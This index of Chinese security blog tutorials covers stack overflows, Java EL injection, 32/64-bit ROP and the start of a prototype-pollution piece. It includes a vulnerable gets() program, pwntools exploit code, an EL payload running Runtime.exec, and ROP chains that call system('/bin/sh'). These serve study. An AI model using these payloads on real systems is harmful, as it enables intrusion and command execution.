<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>栈溢出</title>
    <url>/PWN/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>研究了一段时间，做个总结。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownoabOhk5WZ26NEXg.png"></p>
<span id="more"></span>

<h1 id="栈（stack）"><a href="#栈（stack）" class="headerlink" title="栈（stack）"></a>栈（stack）</h1><p>栈是一种典型的后进先出 <code>(Last in First Out)</code> 的数据结构，其操作主要有<code>压栈 (push)</code> 与<code>出栈 (pop)</code> 两种操作，如下图所示。两种操作都操作栈顶，当然，它也有栈底。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownP6wHiXuI2TCKBUj.png"></p>
<p>高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong>。</p>
<p>需要注意的是，32 位和 64 位程序有以下简单的区别</p>
<ul>
<li><strong>x86</strong><ul>
<li><strong>函数参数</strong>在<strong>函数返回地址</strong>的上方</li>
</ul>
</li>
<li><strong>x64</strong><ul>
<li>System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 <strong>RDI, RSI, RDX, RCX, R8 和 R9 寄存器</strong>中，如果还有更多的参数的话才会保存在栈上。</li>
<li>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常。</li>
</ul>
</li>
</ul>
<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是</p>
<ul>
<li>程序必须向栈上写入数据。</li>
<li>写入的数据大小没有被良好地控制。</li>
</ul>
<h1 id="基本示例"><a href="#基本示例" class="headerlink" title="基本示例"></a>基本示例</h1><p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址所在的段具有可执行权限</strong>。下面，我们举一个简单的例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">success</span><span class="params">()</span> &#123; <span class="built_in">puts</span>(<span class="string">&quot;You Hava already controlled it.&quot;</span>); &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">12</span>];</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">  vulnerable();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>这个程序的主要目的读取一个字符串，并将其输出。<strong>我们希望可以控制程序执行 success 函数。</strong></p>
<p>我们利用如下命令对其进行编译</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">➜  <span class="built_in">stack</span>-example gcc -m32 -fno-<span class="built_in">stack</span>-protector stack_example.c -o stack_example </span><br><span class="line">stack_example.c: In function ‘vulnerable’:</span><br><span class="line">stack_example.c:<span class="number">6</span>:<span class="number">3</span>: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]</span><br><span class="line">   gets(s);</span><br><span class="line">   ^</span><br><span class="line">/tmp/ccPU8rRA.o：在函数‘vulnerable’中：</span><br><span class="line">stack_example.c:(.text+<span class="number">0x27</span>): 警告： the `gets<span class="number">&#x27;</span> function is dangerous and should not be used.</span><br></pre></td></tr></table></figure>


<p>可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出</p>
<blockquote>
<p>历史上，<strong>莫里斯蠕虫</strong>第一种蠕虫病毒就利用了 gets 这个危险函数实现了栈溢出。</p>
</blockquote>
<p>gcc 编译指令中，<code>-m32</code> 指的是生成 32 位程序； <code>-fno-stack-protector</code> 指的是不开启堆栈溢出保护，即不生成 canary。 此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令<code>gcc -v</code>查看 gcc 默认的开关情况。如果含有<code>--enable-default-pie</code>参数则代表 PIE 默认已开启，需要在编译指令中添加参数<code>-no-pie</code>。</p>
<p>编译成功后，可以使用 checksec 工具检查编译出的文件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">➜  <span class="built_in">stack</span>-example checksec stack_example</span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure>


<p>提到编译时的 PIE 保护，Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code> 来控制 ASLR 启动与否，具体的选项有：</p>
<ul>
<li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li>
<li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li>
<li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li>
</ul>
<p>我们可以使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p>
<p>为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。当然读者也可以尝试 ASLR、PIE 开关的不同组合，配合 IDA 及其动态调试功能观察程序地址变化情况（在 ASLR 关闭、PIE 开启时也可以攻击成功）。</p>
<p>确认栈溢出和 PIE 保护关闭后，我们利用 IDA 来反编译一下二进制程序并查看 vulnerable 函数 。可以看到</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vulnerable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [sp+4h] [bp-14h]@1</span></span><br><span class="line"></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |     retaddr     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     saved ebp   |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp<span class="number">-0x14</span>--&gt;+-----------------+</span><br></pre></td></tr></table></figure>


<p>并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x0804843B。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0804843B</span> success         proc near</span><br><span class="line">.text:<span class="number">0804843B</span>                 push    ebp</span><br><span class="line">.text:<span class="number">0804843</span>C                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">0804843</span>E                 sub     esp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">08048441</span>                 sub     esp, <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">08048444</span>                 push    offset s        ; <span class="string">&quot;You Hava already controlled it.&quot;</span></span><br><span class="line">.text:<span class="number">08048449</span>                 call    _puts</span><br><span class="line">.text:<span class="number">0804844</span>E                 add     esp, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">08048451</span>                 nop</span><br><span class="line">.text:<span class="number">08048452</span>                 leave</span><br><span class="line">.text:<span class="number">08048453</span>                 retn</span><br><span class="line">.text:<span class="number">08048453</span> success         endp</span><br></pre></td></tr></table></figure>


<p>那么如果我们读取的字符串为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x14</span>*<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;bbbb&#x27;</span>+success_addr</span><br></pre></td></tr></table></figure>


<p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |    <span class="number">0x0804843B</span>   |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |       bbbb      |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp<span class="number">-0x14</span>--&gt;+-----------------+</span><br></pre></td></tr></table></figure>


<p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x0804843B 在内存中的形式是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">\x3b\x84\x04\x08</span><br></pre></td></tr></table></figure>


<p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了 (关于如何安装以及基本用法，请自行 github)，这里利用 pwntools 的代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># 构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">&#x27;./stack_example&#x27;</span>)</span><br><span class="line">success_addr = <span class="number">0x0804843b</span></span><br><span class="line"><span class="comment"># 构造payload</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x14</span> + <span class="string">&#x27;bbbb&#x27;</span> + p32(success_addr)</span><br><span class="line"><span class="built_in">print</span> p32(success_addr)</span><br><span class="line"><span class="comment"># 向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment"># 将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>


<p>执行一波代码，可以得到</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">➜  <span class="built_in">stack</span>-example python <span class="built_in">exp</span>.py</span><br><span class="line">[+] Starting local process <span class="string">&#x27;./stack_example&#x27;</span>: pid <span class="number">61936</span></span><br><span class="line">;\x84\x0</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">aaaaaaaaaaaaaaaaaaaabbbb;\x84\x0</span><br><span class="line">You Hava already controlled it.</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading in interactive</span><br><span class="line">$ </span><br><span class="line">[*] Process <span class="string">&#x27;./stack_example&#x27;</span> stopped with <span class="built_in">exit</span> code <span class="number">-11</span> (SIGSEGV) (pid <span class="number">61936</span>)</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending in interactive</span><br></pre></td></tr></table></figure>


<p>可以看到我们确实已经执行 success 函数。</p>
<h1 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h1><p>上面的示例其实也展示了栈溢出中比较重要的几个步骤。</p>
<h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p>
<ul>
<li>输入<ul>
<li>gets，直接读取一行，忽略’\x00’</li>
<li>scanf</li>
<li>vscanf</li>
</ul>
</li>
<li>输出<ul>
<li>sprintf</li>
</ul>
</li>
<li>字符串<ul>
<li>strcpy，字符串复制，遇到’\x00’停止</li>
<li>strcat，字符串拼接，遇到’\x00’停止</li>
<li>bcopy</li>
</ul>
</li>
</ul>
<h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p>
<ul>
<li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li>
<li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li>
<li>直接地址索引，就相当于直接给定了地址。</li>
</ul>
<p>一般来说，我们会有如下的覆盖需求</p>
<ul>
<li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li>
<li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li>
<li><strong>覆盖 bss 段某个变量的内容</strong>。</li>
<li>根据现实执行情况，覆盖特定的变量或地址的内容。</li>
</ul>
<p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownjBQdLcvCeyPfIi8.png"></p>
<p>运行时程序的栈：<br>上面高地址处存放的是环境变量和main函数的信息<br>往下是主调函数的栈内存，包括临时变量和控制信息（控制信息包括返回地址和ebp等用来保存的寄存器的值）</p>
<p>调用约定：<br>每个函数调用的时候都会自己平衡自己的堆栈。</p>
<p>每个被调函数被调用的时候先push　ebp所以栈里面会有返回地址和ebp</p>
<h2 id="两个表"><a href="#两个表" class="headerlink" title="两个表"></a><strong>两个表</strong></h2><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownnbq1cslCgh27owZ.png"></p>
<ul>
<li>全局偏移表<code>（GOT：Global Offset Table）</code>存放外部的函数地址</li>
<li>程序链接表<code>（PLT：Procedure Link Table）</code>存放额外代码</li>
</ul>
<p>plt表：函数调用的时候先使用的。<strong>PLT表中的每一项的-数据内容都是对应的GOT表中一项的地址这个是固定不变的</strong>，<strong>PLT表中的数据是跳转到GOT表项的地址</strong>。  </p>
<p>got表：一个指向真正运行函数首地址的指针。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">scanf</span>函数</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">遇到空格(<span class="number">0x20</span>)停止读取</span><br><span class="line"></span><br><span class="line">read函数</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span>  <span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span>;</span><br><span class="line">读取数据遇到\n(<span class="number">0x0a</span>)结束，\x0a会读进去</span><br><span class="line">fd为<span class="number">0</span>从键盘读取</span><br><span class="line"></span><br><span class="line">gets函数</span><br><span class="line">gets(str);</span><br><span class="line">输入遇到\n(<span class="number">0x0a</span>)结束</span><br><span class="line">\x0a不会读进去</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>函数</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, i);</span><br><span class="line">输出直到\x00</span><br><span class="line"></span><br><span class="line">write函数</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> nbyte)</span>;</span><br><span class="line">fd为<span class="number">1</span>输出到显示器</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>函数</span><br><span class="line"><span class="built_in">puts</span>(<span class="type">char</span> *)</span><br><span class="line">相当于<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,s)</span><br><span class="line">输出字符串（遇到\x00结束）</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>函数</span><br><span class="line"><span class="type">char</span> *<span class="title function_">strcpy</span><span class="params">(<span class="type">char</span> *dst, <span class="type">const</span> <span class="type">char</span> *src)</span>;</span><br><span class="line">一直复制直到遇到\x00</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>函数</span><br><span class="line"><span class="type">void</span> *<span class="title function_">memcpy</span><span class="params">(<span class="type">void</span> *dest, <span class="type">const</span> <span class="type">void</span> *src, <span class="type">size_t</span> n)</span>;</span><br><span class="line">复制任意内容</span><br><span class="line"></span><br><span class="line"><span class="built_in">strncpy</span>函数</span><br><span class="line"><span class="type">char</span> *<span class="title function_">strncpy</span><span class="params">(<span class="type">char</span> *dest,<span class="type">char</span> *src,<span class="type">int</span> <span class="type">size_t</span> n)</span>;</span><br><span class="line">如果n&lt;src的长度，只是将src的前n个字符复制到dest的前n个字符，不自动添加<span class="string">&#x27;\0&#x27;</span>。如果src的长度小于n个字节，则以<span class="literal">NULL</span>填充dest直到复制完n个字节</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaEL表达式注入</title>
    <url>/Inject/JAVA%20EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><center>前言</center></h1><p>之前一直打算写一篇解析，拖了一久就开始写了。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownAvYBeWiOuR3talo.png"></p>
<span id="more"></span>

<h1 id="JAVA反射机制"><a href="#JAVA反射机制" class="headerlink" title="JAVA反射机制"></a><center>JAVA反射机制</center></h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>JAVA反射机制是在运行状态中，<strong>对于任意一个类，都能够知道这个类的所有属性和方法</strong>；<strong>对于任意一个对象，都能够调用它的任意一个方法和属性</strong>；这种<code>动态获取的信息</code>以及<code>动态调用对象</code>的方法的功能称为<code>java语言的反射机制</code>。<br>要想解剖一个类,必须先要获取到该类的字节码文件对象。而解剖使用的就是Class类中的方法.所以先要获取到每一个字节码文件对应的Class类型的对象.</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdowngSvljhYbHELAnpt.png"></p>
<ul>
<li>Java中编译类型有两种：<ul>
<li><strong>静态编译</strong>：在编译时确定类型，绑定对象即通过。</li>
<li><strong>动态编译</strong>：运行时确定类型，绑定对象。动态编译最大限度地发挥了Java的灵活性，体现了多态的应用，可以减低类之间的耦合性。</li>
</ul>
</li>
<li>实现Java反射机制的类都位于<code>java.lang.reflect</code>包中：<ol>
<li>Class类：代表一个类</li>
<li>Field类：代表类的成员变量（类的属性）</li>
<li>Method类：代表类的方法</li>
<li>Constructor类：代表类的构造方法</li>
<li>Array类：提供了动态创建数组，以及访问数组的元素的静态方法</li>
</ol>
</li>
</ul>
<p><strong>一句话概括就是使用反射可以赋予jvm动态编译的能力，否则类的元数据信息只能用静态编译的方式实现，例如热加载，Tomcat的classloader等等都没法支持。</strong></p>
<h1 id="EL表达式基础"><a href="#EL表达式基础" class="headerlink" title="EL表达式基础"></a><center>EL表达式基础</center></h1><p>EL表达式是为了转化为JSP代码的，简洁表达式形式，相比直接使用JSP，EL表达式拥有更好的可读性。</p>
<p>EL 表达式语法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;EL表达式&#125;</span><br></pre></td></tr></table></figure>


<p>EL 表达式语法以<code>$&#123;</code>开头，以<code>&#125;</code>结束，中间为合法的表达式。</p>
<h1 id="EL表达式注入原理解析"><a href="#EL表达式注入原理解析" class="headerlink" title="EL表达式注入原理解析"></a><center>EL表达式注入原理解析</center></h1><p><code>pagecontext</code>域可操纵<code>request</code> <code>session</code> <code>application</code>，而这几个域里面均有setAttribute方法</p>
<ul>
<li><p>Attribute方法</p>
<ul>
<li>这个方法作用就是<strong>保存数据</strong>，然后还可以用<code>getAttribute</code>方法来取出。</li>
</ul>
</li>
<li><p>反射中的Method类的invoke() 和getMethod()</p>
<ul>
<li>getMethod() → 获得对象所声明的公开方法  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">person.getClass().getMethod(<span class="string">&quot;Speak&quot;</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
  获得person对象的Speak方法，因为Speak方法没有形参，所以parameterTypes为null</li>
</ul>
</li>
<li><p>getRuntime()方法<br>  <code>java.lang.Runtime.getRuntime() </code>方法返回与当前Java应用程序相关的运行时对象。大多数Runtime类的方法是实例方法，必须相对于当前的运行时对象被调用。</p>
</li>
</ul>
<p>invoke()方法</p>
<ul>
<li>getInputStream方法<ul>
<li><code>getInputStream()方法</code>在java.lang包中可用。</li>
<li><code>getInputStream()方法</code>用于获取流程和子流程的输入流。</li>
<li><code>getInputStream()方法</code>是一个非静态方法，只能通过类对象访问，如果尝试使用类名称访问该方法，则会收到错误消息。</li>
<li>返回输入流时，<code>getInputStream()方法</code>不会引发异常。</li>
</ul>
</li>
</ul>
<p>pagecontext域控制request.getSession()调用其中的getAttribute，getAttribute方法取出任意值a，<code>pageContext.request.getClass().forName(&#39;java.lang.Runtime&#39;)</code>吧<code>java.lang.Runtime</code>反射出来，调用<code>java.lang.Runtime</code> 中的方法<code>getMethod（）</code> ，获得相应对象的getRuntime()方法,得到相关的Method对象，<code>invoke(null,null)</code> 反射得到exec()方法，getInputStream()方法简而言之就是可以有回显。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;pageContext.request.getSession().setAttribute(<span class="string">&#x27;a&#x27;</span>,pageContext.request.getClass().forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="string">&#x27;getRuntime&#x27;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(<span class="string">&#x27;calc&#x27;</span>).getInputStream())&#125;</span><br></pre></td></tr></table></figure>




]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>Inject</tag>
      </tags>
  </entry>
  <entry>
    <title>32位与64位ROP详解</title>
    <url>/PWN/32%E4%BD%8D%E4%B8%8E64%E4%BD%8DROP%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>做pwn的前置知识，写EXP要用到。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown93016202_p0.jpg"></p>
<span id="more"></span>

<h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><h2 id="什么是ROP"><a href="#什么是ROP" class="headerlink" title="什么是ROP"></a>什么是ROP</h2><p>ROP的全称为<code>Return-oriented programming</code>（返回导向编程），也可以理解为面向返回地址的编程，这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。通过上一篇文章栈溢出，我们可以发现栈溢出的控制点是ret处，那么ROP的核心思想就是利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。</p>
<h2 id="为什么要ROP"><a href="#为什么要ROP" class="headerlink" title="为什么要ROP"></a><strong>为什么要ROP</strong></h2><p>探究原因之前，我们先看一下什么是NX(DEP) NX即No-execute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。所以就有了各种绕过办法，rop就是一种</p>
<h1 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h1><p>32位程序的栈溢出，只有输入的字节填满栈空间，和返回地址，即可劫持栈帧，达到控制执行流的效果,</p>
<p>假设栈开辟了20字节的空间，rbp为8字节，由此可得payload如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p32(system_addr) + p32(bin_addr)</span><br></pre></td></tr></table></figure>




<h1 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h1><h3 id="寄存器传参"><a href="#寄存器传参" class="headerlink" title="寄存器传参"></a>寄存器传参</h3><p>64位和32位程序的不同点之一就是，它的前6个参数是通过寄存器传递的，有更多的参数才用栈，所以构造rop链的方式和32位不同。</p>
<p>分别是<code>rdi</code>，<code>rsi</code>，<code>rdx</code>，<code>rcx</code>，<code>r8</code>，<code>r9</code>作为第1-6个参数。rax作为返回值 64位没有栈帧的指针，32位用ebp作为栈帧指针，64位取消了这个设定，所以rbp作为通用寄存器使用。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownfMxenQwX7syu6Ri.png"></p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>构造rop,泄露出libc地址，调用system(“&#x2F;bin&#x2F;sh”)</p>
<h3 id="gadaget准备"><a href="#gadaget准备" class="headerlink" title="gadaget准备"></a>gadaget准备</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROPgadget –binary xxx –only “pop|ret”</span><br></pre></td></tr></table></figure>


<h1 id="泄露system地址和-x2F-bin-x2F-sh"><a href="#泄露system地址和-x2F-bin-x2F-sh" class="headerlink" title="泄露system地址和&#x2F;bin&#x2F;sh"></a>泄露system地址和&#x2F;bin&#x2F;sh</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>] - libc.symbols[<span class="string">&#x27;puts&#x27;</span>] + u64(puts_addr)</span><br><span class="line">sh_addr = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))- libc.symbols[<span class="string">&#x27;puts&#x27;</span>] + u64(puts_addr)</span><br></pre></td></tr></table></figure>


<h1 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h1><p>64位还要考虑堆栈平衡，由此可以有3种payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 泄露libc地址</span></span><br><span class="line">payload1=padding+p64(pop_rdi_ret) + p64(puts_got_addr) + p64(puts_plt_addr)</span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第一个payload利用ret来堆栈平衡</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x0f</span>+<span class="number">0x08</span>) + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br></pre></td></tr></table></figure>




<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 寄存器调用顺序：rdi、rsi、rdx、rcx、r8、r9</span></span><br><span class="line"><span class="comment"># 先利用pop+ret将bin_sh_addr地址弹到rdi寄存器中去，再调用system函数来执行</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x0f</span>+<span class="number">0x08</span>) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)</span><br></pre></td></tr></table></figure>


<p>前两个payload利用64位程序函数调用参数规则构造</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">// ret堆栈平衡，直接返回bin_sh_addr处也可以获得系统权限。</span><br><span class="line"><span class="comment"># payload = &#x27;a&#x27; * (0x0f+0x08) + p64(ret_addr) + p64(bin_sh_addr)</span></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>ROP</tag>
      </tags>
  </entry>
  <entry>
    <title>原型链污染</title>
    <url>/JavaScript/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>需要一定的js基础</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownZHNuSfXCDk4OEab.jpg"></p>
<span id="more"></span>

<h1 id="prototype和-proto"><a href="#prototype和-proto" class="headerlink" title="prototype和__proto__"></a><code>prototype</code>和<code>__proto__</code></h1><p>又称<code>原型链污染</code>。</p>
<p>在JS语言中，函数即对象，如果要定义一个类，需要以<code>定义</code> 构造函数的方式来定义</p>
